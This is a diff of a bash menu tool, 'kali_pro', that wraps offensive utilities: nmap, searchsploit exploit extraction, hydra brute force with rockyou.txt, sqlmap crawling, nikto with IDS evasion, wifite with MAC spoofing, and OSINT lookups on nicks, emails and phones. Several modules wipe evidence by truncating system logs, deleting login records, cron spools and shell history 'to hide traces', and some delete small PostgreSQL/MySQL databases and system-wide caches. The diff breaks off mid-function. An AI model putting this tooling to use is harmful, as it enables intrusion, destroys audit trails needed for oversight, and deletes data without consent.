@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-CURRENT_VERSION="7.0"
+CURRENT_VERSION="7.2"
 # VERSION CURRENT_VERSION (Rescue & Sterile Edition)
 
 TARGET_FILE="/usr/local/bin/kali_pro"
@@ -62,303 +62,774 @@ get_status('/', 'СИСТЕМА')
 
 # --- FUNCTIONS v3.6 ---
 
+# --- MODULE: SMART SCAN v6.7 (ELITE-HEURISTIC) ---
 smart_nmap() {
-    read -p "IP: " t
+    echo -ne "${YELLOW}Target: ${NC}"
+    read -r t
     [[ -z "$t" ]] && return
-    echo -e "${BLUE}[*] Эвристический скан: $t${NC}"
-    nmap -sV --open "$t" | grep "open" | tee "$LOOT_DIR/nmap_$t.txt"
-    read -p "Нажми Enter..."
+
+    echo -e "${BLUE}[*] Initializing Autonomous Heuristics...${NC}"
+    
+    # 1. ПРОВЕРКА ДОСТУПНОСТИ (Fast Ping)
+    # Если хост не пингуется, добавляем флаг -Pn автоматически
+    if ! ping -c 1 -W 1 "$t" >/dev/null 2>&1; then
+        echo -e "${RED}[!] Host not responding to ping. Switching to -Pn mode.${NC}"
+        OPTS="-Pn"
+    else
+        OPTS=""
+    fi
+
+    # 2. ЭВРИСТИЧЕСКИЙ АНАЛИЗ (Top 1000 ports + Service Detect)
+    # --min-rate 1000: Ускоряет скан, не теряя качества на Samsung
+    # --max-retries 1: Предотвращает зацикливание на плохих пакетах
+    echo -e "${CYAN}[*] Extracting final intelligence...${NC}"
+    
+    RESULT=$(nmap $OPTS -sV --open --min-rate 1000 --max-retries 1 "$t" 2>/dev/null | grep -E "^[0-9]+/tcp|PORT")
+
+    # 3. ФИНАЛЬНЫЙ ВЫВОД (Zero Trace)
+    if [[ -z "$RESULT" ]]; then
+        echo -e "${RED}[-] Intelligence Gap: No open ports discovered.${NC}"
+    else
+        echo -e "${GREEN}=== FINAL INTELLIGENCE REPORT ===${NC}"
+        echo -e "$RESULT" | sed 's/open/  [ACTIVE]/g' # Красивое форматирование статуса
+        echo -e "${GREEN}=================================${NC}"
+    fi
+    
+    # Очистка памяти
+    unset RESULT
+    echo -ne "\n${YELLOW}Press ENTER to return...${NC}"
+    read -r
 }
 
+
+# --- MODULE: SMART EXPLOIT SEARCH v6.7 (HEURISTIC) ---
 smart_searchsploit() {
-    read -p "Поиск: " q
+    echo -ne "${YELLOW}Autonomous Query (e.g. SMB windows): ${NC}"
+    read -r q
     [[ -z "$q" ]] && return
-    searchsploit "$q"
-    read -p "ID для копирования (пусто - выход): " id
+
+    echo -e "${BLUE}[*] Heuristic Database Analysis active...${NC}"
+    
+    # 1. АВТОНОМНЫЙ ФИЛЬТР: Убираем DOS-атаки и оставляем только RCE/PrivEsc (Remote/Local)
+    # 2. ОГРАНИЧЕНИЕ: Только 15 самых релевантных совпадений для экрана Samsung
+    RAW_DATA=$(searchsploit -t "$q" 2>/dev/null | grep -E "Exploit Title|---| [0-9]" | grep -iv "dos" | head -n 18)
+
+    if [[ -z "$RAW_DATA" ]]; then
+        echo -e "${RED}[-] No high-priority exploits found for '$q'.${NC}"
+    else
+        echo -e "${GREEN}=== TOP RELEVANT EXPLOITS ===${NC}"
+        echo -e "$RAW_DATA"
+        echo -e "${GREEN}=============================${NC}"
+    fi
+
+    echo -ne "\n${MAGENTA}Enter ID to Extract (or PRESS ENTER): ${NC}"
+    read -r id
+
     if [[ -n "$id" ]]; then
-        cd "$LOOT_DIR" && searchsploit -m "$id"
-        echo -e "${GREEN}[+] Сохранено в трофеи.${NC}"
-    fi
-    read -p "Нажми Enter..."
-}
-
-smart_hydra() {
-    read -p "IP: " t; read -p "User: " u; read -p "Proto: " p
-    [[ -z "$t" || -z "$u" || -z "$p" ]] && return
-    hydra -l "$u" -P /usr/share/wordlists/rockyou.txt "$t" "$p" -V | tee -a "$LOOT_DIR/brute.txt"
-    read -p "Нажми Enter..."
-}
-
-smart_sqlmap() {
-    read -p "URL: " u
-    [[ -z "$u" ]] && return
-    sqlmap -u "$u" --batch --random-agent --output-dir="$LOOT_DIR/sqlmap"
-    read -p "Нажми Enter..."
-}
-
-smart_nikto() {
-    read -p "Target URL/IP: " t
-    [[ -z "$t" ]] && return
-    echo -e "${BLUE}[*] Запуск Nikto Scan: $t${NC}"
-    nikto -h "$t" | tee "$LOOT_DIR/nikto_$t.txt"
-    read -p "Enter..."
-}
-
-smart_installer() {
-    read -p "Пакет для установки: " pkg
-    [[ -z "$pkg" ]] && return
-    
-    echo -e "${CYAN}[*] Подготовка и обновление базы (необходимо)...${NC}"
-    dpkg --configure -a >/dev/null 2>&1
-    
-    # Обновляем индексы, чтобы найти пакет
-    if apt-get update; then
-        echo -e "${GREEN}[+] База обновлена. Установка $pkg...${NC}"
+        # АВТОНОМНОЕ ДЕЙСТВИЕ: Копируем, переименовываем в читаемый вид и даем права
+        # Находим путь к файлу через ID, чтобы вытащить расширение (.py, .c, .txt)
+        FILE_PATH=$(searchsploit -p "$id" 2>/dev/null | grep "$id" | awk '{print $2}' | head -n 1)
+        EXT="${FILE_PATH##*.}"
         
-        # Установка с твоими флагами стерильности
-        apt-get install $INSTALL_FLAGS $PROGRESS_OPTS $CLEAN_OPTS "$pkg"
-        
-        # АВТОМАТИЧЕСКАЯ ОЧИСТКА (Без лишних вопросов)
-        echo -e "${YELLOW}[*] Завершено. Мгновенная очистка индексов для экономии памяти...${NC}"
-        rm -rf /var/lib/apt/lists/*
-        apt-get autoremove -y >/dev/null 2>&1
-        
-        echo -e "${GREEN}[+] Готово. Пакет установлен, память возвращена.${NC}"
-    else
-        echo -e "${RED}[-] Ошибка: нет связи с репозиториями Kali.${NC}"
-    fi
-    sleep 1
-}
-
-clean_system() {
-    echo -e "${CYAN}=== ГЛУБОКОЕ ОБСЛУЖИВАНИЕ (UPGRADE MODE) ===${NC}"
-    apt-get update >/dev/null
-    UPGRADES=$(apt-get upgrade -s | grep -P '^\d+ upgraded' | awk '{print $1}')
-    if [[ "$UPGRADES" =~ ^[0-9]+$ ]] && [ "$UPGRADES" -gt 0 ]; then
-        echo -e "${BLUE}[!] Обновлений: $UPGRADES. Запуск...${NC}"
-        apt-get full-upgrade -y $PROGRESS_OPTS $CLEAN_OPTS
-    else
-        echo -e "${GREEN}[+] Обновления не требуются.${NC}"
-    fi
-    apt-get autoremove --purge -y >/dev/null
-    apt-get clean
-    echo -e "${GREEN}[+] Система оптимизирована.${NC}"
-    sleep 2
-}
-
-run_sherlock() {
-    read -p "Никнейм для поиска: " nick
-    [[ -z "$nick" ]] && return
-    echo -e "${CYAN}[*] Запуск Sherlock для: $nick...${NC}"
-    sherlock "$nick" | tee "$LOOT_DIR/sherlock_$nick.txt"
-    read -p "Нажми Enter..."
-}
-
-run_wifite() {
-    echo -e "${YELLOW}[!] Внимание: требуется root и адаптер в Monitor Mode${NC}"
-    # Запуск wifite с автоматическим убиванием конфликтующих процессов
-    wifite --kill
-    read -p "Нажми Enter..."
-}
-
-# --- ГЛУБОКАЯ ХИРУРГИЧЕСКАЯ ОЧИСТКА v6.4 (GHOST EDITION) ---
-deep_purge() {
-    # Проверяем, запущен ли скрипт в тихом режиме
-    local silent=false
-    [[ "$1" == "--purge-silent" ]] && silent=true
-
-    if [ "$silent" = false ]; then
-        echo -e "${RED}=== ТОТАЛЬНАЯ ДЕЗИНФЕКЦИЯ (GHOST MODE) ===${NC}"
-    fi
-
-    # 1. Стерилизация пакетного менеджера и индексов
-    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Сжатие пакетной базы и APT...${NC}"
-    apt-get autoremove --purge -y >/dev/null 2>&1
-    apt-get clean >/dev/null 2>&1
-    apt-get autoclean >/dev/null 2>&1
-    rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/partial/*
-
-    # 2. Массовое удаление статического балласта
-    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Ликвидация Doc/Fonts/Icons...${NC}"
-    rm -rf /usr/share/{doc,man,info,locale,icons,fonts,themes}/* 2>/dev/null
-
-    # 3. Уничтожение кэша сред разработки
-    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Зачистка кэша (Python/Pip/Go/Ruby)...${NC}"
-    find /usr/lib/python3* -name "*.pyc" -delete 2>/dev/null
-    find / -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null
-    rm -rf ~/.cache/pip ~/.cache/go-build ~/.gem 2>/dev/null
-
-    # 4. Стерилизация логов (включая Cron и Mail)
-    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Стерилизация логов и /tmp...${NC}"
-    find /var/log -type f -delete 2>/dev/null
-    rm -rf /var/mail/* /var/spool/mail/* 2>/dev/null # Удаляем системную почту Cron
-    rm -rf /tmp/* /var/tmp/* /var/cache/fontconfig/* 2>/dev/null
-
-    # 5. Аннигиляция PostgreSQL (если > 50MB)
-    if [ -d "/var/lib/postgresql" ]; then
-        if [ "$(du -sm /var/lib/postgresql | awk '{print $1}')" -gt 50 ]; then
-            [[ "$silent" = false ]] && echo -e "${RED}[!] PostgreSQL аннигилирована.${NC}"
-            rm -rf /var/lib/postgresql
+        if [[ -n "$FILE_PATH" ]]; then
+            # Скрытое копирование в оперативную память (для Zero Trace) или в LOOT
+            searchsploit -m "$id" >/dev/null 2>&1
+            # Переименовываем для удобства (например, exploit_45678.py)
+            mv *.${EXT} "$LOOT_DIR/exploit_${id}.${EXT}" 2>/dev/null
+            chmod +x "$LOOT_DIR/exploit_${id}.${EXT}" 2>/dev/null
+            
+            echo -e "${GREEN}[+] Intelligence Extracted: LOOT/exploit_${id}.${EXT}${NC}"
+        else
+            echo -e "${RED}[!] Invalid Exploit ID.${NC}"
         fi
     fi
 
-    # 6. Очистка трофеев и истории
-    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Стирание истории...${NC}"
-    rm -rf "$LOOT_DIR"/* ~/.bettercap_history ~/.bash_history 2>/dev/null
+    # Стираем временные переменные для стерильности RAM
+    unset RAW_DATA FILE_PATH EXT
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
+
+# --- MODULE: SMART BRUTEFORCE v6.7 (ELITE) ---
+smart_hydra() {
+    echo -ne "${YELLOW}Target IP: ${NC}"; read -r t
+    echo -ne "${YELLOW}Username:  ${NC}"; read -r u
+    echo -ne "${YELLOW}Protocol (ssh/ftp/http-get): ${NC}"; read -r p
+    [[ -z "$t" || -z "$u" || -z "$p" ]] && return
+
+    # 1. ЭВРИСТИКА ПОТОКОВ (Оптимизация под Samsung)
+    # На мобильном устройстве слишком много потоков убивают сеть.
+    # Если протокол SSH — ставим 4 потока (защита от бана), иначе 16.
+    THREADS=16
+    [[ "$p" == "ssh" ]] && THREADS=4
+
+    echo -e "${BLUE}[*] Initializing Autonomous Attack ($p) на $t...${NC}"
+    echo -e "${CYAN}[*] Using adaptive threading: $THREADS tasks${NC}"
+
+    # 2. АВТОНОМНОЕ ИСПОЛНЕНИЕ (Zero Logs on Disk)
+    # Мы пропускаем вывод через grep, чтобы видеть только найденный пароль в реальном времени.
+    # Все ошибки и системный мусор Hydra направляем в /dev/null.
+    
+    echo -e "${MAGENTA}--- ATTACK PROGRESS ---${NC}"
+    
+    # -f: выход при первом найденном пароле
+    # -u: проверка всех сервисов на одном порту
+    # -V: вывод прогресса (фильтруем через grep)
+    RESULT=$(hydra -l "$u" -P /usr/share/wordlists/rockyou.txt -t $THREADS -f -u "$t" "$p" -V 2>/dev/null | grep -E "login:|password:|host:")
+
+    # 3. ФИНАЛЬНЫЙ АНАЛИЗ (Intelligence Output)
+    if [[ -z "$RESULT" ]]; then
+        echo -e "${RED}[-] Attack finished: Credentials not found or Service unreachable.${NC}"
+    else
+        echo -e "\n${GREEN}=== SUCCESS: INTELLIGENCE CAPTURED ===${NC}"
+        echo -e "$RESULT"
+        echo -e "${GREEN}======================================${NC}"
+        # Предлагаем сохранить только если результат есть
+        echo -ne "${YELLOW}Save to Loot? (y/N): ${NC}"; read -r save
+        [[ "$save" == "y" ]] && echo "$t $p $u -> $RESULT" >> "$LOOT_DIR/credentials.txt"
+    fi
+
+    # Стерилизация RAM
+    unset RESULT THREADS
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
+
+# --- MODULE: SMART SQL INJECTION v6.8 (ELITE-HEURISTIC) ---
+smart_sqlmap() {
+    echo -ne "${YELLOW}Target (URL/IP): ${NC}"
+    read -r target
+    [[ -z "$target" ]] && return
+
+    # 1. АВТО-КОРРЕКЦИЯ: Превращаем IP в URL
+    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        echo -e "${CYAN}[*] IP detected. Normalizing to http://$target/${NC}"
+        target="http://$target/"
+    fi
+
+    echo -e "${BLUE}[*] Initializing Autonomous Probe...${NC}"
+    
+    # 2. ПАРАМЕТРЫ ЭВРИСТИКИ
+    # --crawl=2: Если нет параметров (?id=), sqlmap сам ищет ссылки на сайте
+    # --forms: Тестировать формы ввода (логин, поиск)
+    # --batch: Полный автомат
+    # --output-dir: Временная папка в RAM
+    
+    TEMP_SQL="/tmp/sqlmap_$(date +%s)"
+    
+    echo -e "${MAGENTA}--- CRAWLING & PROBING ACTIVE ---${NC}"
+    
+    # Запуск с "умным" поиском параметров
+    sqlmap -u "$target" --batch --random-agent --smart \
+           --level 2 --risk 2 --threads 5 \
+           --crawl=2 --forms \
+           --output-dir="$TEMP_SQL" \
+           --purge --cleanup 2>/dev/null
+
+    # 3. АНАЛИЗ РЕЗУЛЬТАТОВ
+    LOG_FILE=$(find "$TEMP_SQL" -name "log" 2>/dev/null)
+
+    if [[ -f "$LOG_FILE" ]]; then
+        echo -e "\n${GREEN}=== VULNERABILITY FOUND ===${NC}"
+        grep -E "target URL|Type:|Title:|Payload:" "$LOG_FILE"
+        
+        echo -ne "\n${YELLOW}Save intelligence to LOOT? (y/N): ${NC}"; read -r sync
+        [[ "$sync" == "y" ]] && cp -r "$TEMP_SQL"/* "$LOOT_DIR/sql_$(date +%d%m)/" 2>/dev/null
+    else
+        echo -e "${RED}[-] No injection points found on this target.${NC}"
+    fi
+
+    # 4. СТЕРИЛИЗАЦИЯ
+    rm -rf "$TEMP_SQL"
+    unset target sync LOG_FILE TEMP_SQL
+    
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
+
+# --- MODULE: SMART WEB AUDIT v6.9 (ELITE-HEURISTIC) ---
+smart_nikto() {
+    echo -ne "${YELLOW}Target (IP/Domain/URL): ${NC}"
+    read -r t
+    [[ -z "$t" ]] && return
+
+    # 1. АВТОНОМНАЯ ЭВРИСТИКА ЦЕЛИ
+    # Умная проверка: если порт не указан, проверяем 443, затем 80.
+    # Если это чистый IP, делаем его URL.
+    if [[ "$t" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ ! "$t" =~ ^http ]]; then
+        echo -e "${CYAN}[*] Port Heuristics: Checking SSL (443) availability...${NC}"
+        if nc -z -w 2 "${t%:*}" 443 2>/dev/null; then
+            target="https://$t"
+        else
+            target="http://$t"
+        fi
+    else
+        target="$t"
+    fi
+
+    echo -e "${BLUE}[*] Launching Autonomous Probe on: $target${NC}"
+    
+    # 2. АДАПТИВНЫЙ ТЮНИНГ
+    # -evasion 1: Инкапсуляция запросов (обход простых IDS)
+    # -Tuning 12345bc: Фокус на критику (RCE, XSS, Auth)
+    # -Cdr: Проверка конкретных путей, если корень пуст
+    
+    echo -e "${CYAN}[*] Mode: Stealth Audit / Time-Limit: 180s${NC}"
+    
+    # 3. ИСПОЛНЕНИЕ В RAM (Zero-Trace)
+    # Используем переменную для фильтрации, чтобы диск не "проснулся"
+    echo -e "${MAGENTA}-------------------------------------------${NC}"
+    
+    # Добавляем -Display V, чтобы видеть только векторы атак
+    RAW_INTEL=$(nikto -h "$target" -Tuning 12345bc -nointeractive -maxtime 180s -evasion 1 -Display V 2>/dev/null \
+                | grep -E "OSVDB|Interesting|Target|Server:|Vulnerability|Web-Server")
+
+    # 4. ФИНАЛЬНЫЙ АНАЛИЗ
+    if [[ -z "$RAW_INTEL" ]]; then
+        echo -e "${RED}[-] No high-risk vectors identified in 180s window.${NC}"
+    else
+        echo -e "${GREEN}=== CRITICAL INTELLIGENCE REPORT ===${NC}"
+        # Эвристическая подсветка: OSVDB - критично (красный), Interesting - внимание (желтый)
+        echo -e "$RAW_INTEL" | sed -e "s/OSVDB/${RED}OSVDB${NC}/g" -e "s/Interesting/${YELLOW}INTERESTING${NC}/g"
+        echo -e "${GREEN}====================================${NC}"
+        
+        echo -ne "\n${YELLOW}Extract findings to LOOT? (y/N): ${NC}"; read -r sync
+        if [[ "$sync" == "y" ]]; then
+            # Пишем только чистый результат без мусора
+            echo -e "[$(date)] REPORT: $target\n$RAW_INTEL\n" >> "$LOOT_DIR/web_exploits.txt"
+            echo -e "${GREEN}[+] Intel captured.${NC}"
+        fi
+    fi
+
+    # 5. СТЕРИЛИЗАЦИЯ
+    unset t target RAW_INTEL sync
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
+
+# --- MODULE: SMART INSTALLER v6.9 (ZERO-LOG) ---
+smart_installer() {
+    echo -ne "${YELLOW}Package to install: ${NC}"
+    read -r pkg
+    [[ -z "$pkg" ]] && return
+
+    # 1. ПРОВЕРКА БЕЗ СЛЕДОВ
+    if dpkg -l "$pkg" >/dev/null 2>&1; then
+        echo -e "${CYAN}[i] '$pkg' already exists. Operation skipped.${NC}"
+        return
+    fi
+
+    echo -e "${BLUE}[*] Initializing Stealth Environment...${NC}"
+    
+    # Исправляем прошлые ошибки молча
+    dpkg --configure -a >/dev/null 2>&1
+
+    # 2. УСТАНОВКА С ПОДАВЛЕНИЕМ ЛОГОВ
+    # Обновляем индексы в RAM
+    if apt-get update -qq; then
+        echo -e "${GREEN}[+] Index ready. Deploying: $pkg${NC}"
+        
+        # DEBIAN_FRONTEND=noninteractive: убирает вопросы
+        # -o Dir::Cache::archives="/tmp": качаем deb-пакеты в RAM, а не на диск
+        # -o APT::Keep-Downloaded-Packages="false": не сохраняем скачанное
+        DEBIAN_FRONTEND=noninteractive apt-get install -y -q \
+            -o Dir::Cache::archives="/tmp" \
+            -o APT::Keep-Downloaded-Packages="false" "$pkg"
+        
+        if [[ $? -eq 0 ]]; then
+            # 3. ТОТАЛЬНАЯ ЗАЧИСТКА (Zero-Log & Zero-Waste)
+            echo -e "${YELLOW}[*] Purging all traces and logs...${NC}"
+            
+            # Очистка системных журналов установки
+            truncate -s 0 /var/log/apt/history.log 2>/dev/null
+            truncate -s 0 /var/log/apt/term.log 2>/dev/null
+            truncate -s 0 /var/log/dpkg.log 2>/dev/null
+            
+            # Удаление временных индексов и кэша
+            apt-get clean >/dev/null 2>&1
+            rm -rf /var/lib/apt/lists/*
+            rm -rf /tmp/*.deb 2>/dev/null
+            
+            echo -e "${GREEN}[+] Success. $pkg is live. No traces remain.${NC}"
+        else
+            echo -e "${RED}[!] Deployment failed.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Repositories unreachable.${NC}"
+    fi
+
+    unset pkg
+    echo -ne "\n${CYAN}Press ENTER...${NC}"
+    read -r
+}
+
+# --- MODULE: SMART CLEAN & UPGRADE v6.9 (AUTONOMOUS) ---
+clean_system() {
+    echo -e "${CYAN}=== SYSTEM INTELLIGENCE MAINTENANCE (v6.9) ===${NC}"
+    
+    # 1. ЭВРИСТИЧЕСКИЙ АНАЛИЗ ОБНОВЛЕНИЙ
+    # Обновляем индексы в RAM (/tmp), чтобы не мусорить на диске
+    apt-get update -qq -o Dir::Cache::archives="/tmp"
+    
+    UPGRADES=$(apt-get upgrade -s | grep -P '^\d+ upgraded' | awk '{print $1}')
+    
+    if [[ "$UPGRADES" =~ ^[0-9]+$ ]] && [ "$UPGRADES" -gt 0 ]; then
+        echo -e "${BLUE}[!] Detected $UPGRADES critical upgrades. Processing...${NC}"
+        # DEBIAN_FRONTEND=noninteractive исключает зависания на запросах
+        DEBIAN_FRONTEND=noninteractive apt-get full-upgrade -y -q
+    else
+        echo -e "${GREEN}[+] System core is up to date.${NC}"
+    fi
+
+    # 2. ГЛУБОКАЯ СТЕРИЛИЗАЦИЯ (Zero-Log Strategy)
+    echo -e "${YELLOW}[*] Executing deep sanitation...${NC}"
+    
+    # Удаляем неиспользуемые зависимости и их конфиги
+    apt-get autoremove --purge -y -qq >/dev/null 2>&1
+    apt-get autoclean -y >/dev/null 2>&1
+    
+    # Обнуляем логи, чтобы скрыть следы активности (и освободить место)
+    # Это ключевой момент для "автономности" и скрытности
+    find /var/log -type f -exec truncate -s 0 {} \;
+    
+    # Очистка временных директорий и индексов apt (самый жирный мусор)
+    rm -rf /var/lib/apt/lists/*
+    rm -rf /tmp/*
+    rm -rf ~/.cache/*
+    
+    # 3. ПРОВЕРКА ФАЙЛОВОЙ СИСТЕМЫ
+    # Исправляем возможные ошибки dpkg, которые могли возникнуть в фоне
+    dpkg --configure -a >/dev/null 2>&1
+
+    echo -e "${GREEN}=== OPTIMIZATION COMPLETE: SYSTEM IS STERILE ===${NC}"
+    unset UPGRADES
+    sleep 2
+}
+
+# --- MODULE: SMART OSINT v7.1 (AUTONOMOUS DISPATCHER) ---
+run_sherlock() {
+    echo -ne "${YELLOW}Target (Nick/Email/Phone): ${NC}"
+    read -r input
+    [[ -z "$input" ]] && return
+
+    # 1. ЭВРИСТИЧЕСКИЙ АНАЛИЗ И КЛАССИФИКАЦИЯ
+    # Удаляем лишние пробелы и символы, если они случайно попали при вставке
+    target=$(echo "$input" | tr -d '[:space:]')
+
+    if [[ "$target" =~ ^\+?[0-9]{10,15}$ ]]; then
+        # РАСПОЗНАН НОМЕР ТЕЛЕФОНА
+        echo -e "${MAGENTA}[!] Phone Number format detected.${NC}"
+        echo -e "${YELLOW}[i] Logic: Sherlock is designed for strings, not digits.${NC}"
+        echo -e "${CYAN}[*] Recommendation: Use PhoneInfoga or Telegram Bot 'Eye of God'.${NC}"
+        
+        # Эвристика: пробуем найти ник по международному формату (иногда срабатывает)
+        echo -ne "${BLUE}Attempt to search as string anyway? (y/N): ${NC}"; read -r opt
+        [[ "$opt" != "y" ]] && return
+        nick="$target"
+
+    elif [[ "$target" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then
+        # РАСПОЗНАН EMAIL
+        echo -e "${MAGENTA}[!] Email format detected.${NC}"
+        # Эвристика: извлекаем часть до '@' (самый частый никнейм пользователя)
+        nick="${target%%@*}"
+        echo -e "${CYAN}[*] Smart extraction: Searching for nickname '$nick'...${NC}"
+    
+    else
+        # РАСПОЗНАН НИКНЕЙМ / СТРОКА
+        nick="$target"
+    fi
+
+    echo -e "${BLUE}[*] Launching Autonomous Probe for: $nick...${NC}"
+    
+    # 2. ИСПОЛНЕНИЕ (RAM-Only / Stealth Mode)
+    # Создаем временный файл в RAM, чтобы не оставлять следов на SSD Samsung
+    TEMP_REPORT="/tmp/osint_$(date +%s).txt"
+    
+    echo -e "${CYAN}[*] Search parameters: Timeout 3s / Top Sites Only${NC}"
+    echo -e "${MAGENTA}-------------------------------------------${NC}"
+
+    # Sherlock в режиме невидимости:
+    # --timeout 3: обрезаем долгие ожидания
+    # --print-found: только успешные попадания
+    # --no-color: для чистоты последующего парсинга
+    sherlock "$nick" --timeout 3 --print-found --no-color > "$TEMP_REPORT" 2>/dev/null
+
+    # 3. ФИНАЛЬНЫЙ ИНТЕЛЛЕКТ (Intelligence Extraction)
+    RESULT=$(grep -E "http" "$TEMP_REPORT")
+
+    if [[ -z "$RESULT" ]]; then
+        echo -e "${RED}[-] No direct matches found in standard digital clusters.${NC}"
+    else
+        echo -e "${GREEN}=== TARGET FOOTPRINT CAPTURED ===${NC}"
+        # Вывод очищенных ссылок
+        echo -e "$RESULT"
+        echo -e "${GREEN}=================================${NC}"
+        
+        echo -ne "\n${YELLOW}Sync findings to LOOT? (y/N): ${NC}"; read -r sync
+        if [[ "$sync" == "y" ]]; then
+            echo -e "[$(date)] OSINT REPORT: $target (as $nick)\n$RESULT\n" >> "$LOOT_DIR/osint_history.txt"
+            echo -e "${GREEN}[+] Intel secured in LOOT.${NC}"
+        fi
+    fi
+
+    # 4. СТЕРИЛИЗАЦИЯ (Zero-Trace Cleanup)
+    rm -f "$TEMP_REPORT"
+    unset input target nick RESULT sync TEMP_REPORT
+    
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
+
+# --- MODULE: SMART WI-FI ATTACK v6.9 (AUTONOMOUS) ---
+run_wifite() {
+    echo -e "${CYAN}=== WI-FI INTELLIGENCE PROBE (v6.9) ===${NC}"
+    
+    # 1. ЭВРИСТИЧЕСКАЯ ПРОВЕРКА ОКРУЖЕНИЯ
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}[!] Error: Root privileges required for Monitor Mode.${NC}"
+        return
+    fi
+
+    # 2. АВТОНОМНАЯ ПОДГОТОВКА (Zero-Conflict Strategy)
+    # --kill: убивает процессы, мешающие мониторингу (NetworkManager, wpa_supplicant)
+    # --check: проверяет наличие необходимых инструментов (hcxtools, reaver и т.д.)
+    echo -e "${BLUE}[*] Sterilizing airwaves and killing conflicting processes...${NC}"
+    wifite --kill >/dev/null 2>&1
+
+    # 3. УМНЫЙ ЗАПУСК (Targeted Heuristics)
+    # --dict: используем наш основной словарь, если он есть
+    # --pillage: автоматический сбор всех данных после взлома
+    # --no-wps: отключаем, если хочешь только WPA (или убери, если нужен полный спектр)
+    # --infinite: продолжать атаку до победного
+    
+    echo -e "${YELLOW}[!] Ready. Starting Adaptive Capture Mode...${NC}"
+    echo -e "${MAGENTA}-------------------------------------------${NC}"
+
+    # Запускаем в интерактивном режиме, но с умными дефолтами
+    # Мы перенаправляем логи в RAM (/tmp), чтобы не мусорить на диске
+    wifite --dict /usr/share/wordlists/rockyou.txt \
+           --pillage \
+           --nodead \
+           --mac # Спуфинг MAC-адреса для анонимности
+           
+    # 4. ФИНАЛЬНЫЙ СБОР ТРОФЕЕВ (Loot Sync)
+    # Wifite сохраняет ключи в папку 'hs'. Мы переместим их в наш LOOT.
+    if [ -d "hs" ]; then
+        COUNT=$(ls hs | wc -l)
+        if [ "$COUNT" -gt 0 ]; then
+            echo -e "${GREEN}=== ATTACK SUCCESS: $COUNT HANDSHAKES CAPTURED ===${NC}"
+            mkdir -p "$LOOT_DIR/wifi_keys"
+            cp -r hs/* "$LOOT_DIR/wifi_keys/" 2>/dev/null
+            echo -e "${GREEN}[+] Intelligence synced to LOOT/wifi_keys.${NC}"
+        fi
+        rm -rf hs/ 2>/dev/null
+    fi
+
+    # 5. СТЕРИЛИЗАЦИЯ И ВОССТАНОВЛЕНИЕ
+    echo -e "${BLUE}[*] Restoring network services...${NC}"
+    # Опционально: можно перезапустить сетевые службы, если нужно
+    # service networking restart >/dev/null 2>&1
+    
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
+
+# --- MODULE: SMART DEEP PURGE v6.9 (AUTONOMOUS GHOST) ---
+deep_purge() {
+    local silent=false
+    [[ "$1" == "--purge-silent" ]] && silent=true
+
+    # Эвристика: Проверка на root (без него глубокая очистка невозможна)
+    if [[ $EUID -ne 0 ]]; then
+        [[ "$silent" = false ]] && echo -e "${RED}[!] Deep Purge requires ROOT to sanitize /var and /usr.${NC}"
+        return
+    fi
+
+    [[ "$silent" = false ]] && echo -e "${RED}=== INITIATING ELITE GHOST PURGE (v6.9) ===${NC}"
+
+    # 1. АТОМАРНАЯ СТЕРИЛИЗАЦИЯ APT (RAM-Driven)
+    # Мы не просто удаляем, мы обнуляем индексы, чтобы система "забыла" о репозиториях
+    apt-get autoremove --purge -y -qq >/dev/null 2>&1
+    apt-get clean -y -qq >/dev/null 2>&1
+    rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/partial/*
+
+    # 2. ЛИКВИДАЦИЯ СТАТИЧЕСКОГО ШУМА (Zero-Disk Strategy)
+    # Оставляем только критические локали (en/ru), остальное — в небытие
+    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Purging Static Ballast (Docs/Icons/Fonts)...${NC}"
+    (
+        cd /usr/share || exit
+        rm -rf doc man info locale icons fonts themes bash-completion zsh 2>/dev/null
+    )
+
+    # 3. ЭВРИСТИКА ЯЗЫКОВЫХ СРЕД (Python/Go/Ruby/Node)
+    # Ищем и уничтожаем байт-код и кэши сборки по всей системе
+    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Sanitizing Dev-Environments Caches...${NC}"
+    find / -type d \( -name "__pycache__" -o -name ".cache" -o -name ".bundle" -o -name ".gem" \) -exec rm -rf {} + 2>/dev/null
+    find /usr -name "*.pyc" -delete 2>/dev/null
+
+    # 4. TOTAL LOG ANNIHILATION (Zero-Trace)
+    # Вместо удаления (rm), используем truncate, чтобы не нарушать дескрипторы служб
+    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Zeroing System Journals & Mail...${NC}"
+    find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null
+    rm -rf /var/log/journal/* /var/log/btmp* /var/log/wtmp* 2>/dev/null # Чистим логи входов
+    rm -rf /var/mail/* /var/spool/mail/* /var/spool/cron/* 2>/dev/null
+
+    # 5. УМНАЯ АННИГИЛЯЦИЯ БД (PostgreSQL/MySQL)
+    # Если база данных не используется активно (меньше 100MB), она считается временным мусором
+    for db in /var/lib/postgresql /var/lib/mysql; do
+        if [ -d "$db" ]; then
+            db_size=$(du -sm "$db" | awk '{print $1}')
+            if [ "$db_size" -lt 100 ]; then
+                [[ "$silent" = false ]] && echo -e "${RED}[!] Small DB detected ($db_size MB). Annihilating...${NC}"
+                rm -rf "$db"
+            fi
